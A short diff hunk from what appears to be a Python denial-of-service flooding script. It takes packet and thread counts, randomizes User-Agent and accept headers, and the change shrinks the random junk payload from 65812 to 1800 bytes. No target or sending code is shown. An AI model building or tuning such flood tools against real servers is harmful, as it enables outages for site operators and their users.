@@ -36,7 +36,7 @@ pack = int(input('[+] Packets: '))
 thread = int(input('[+] Threads: '))
 def wibu():
     global useragents, ref, acceptall
-    hh = random._urandom(65812)
+    hh = random._urandom(1800)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
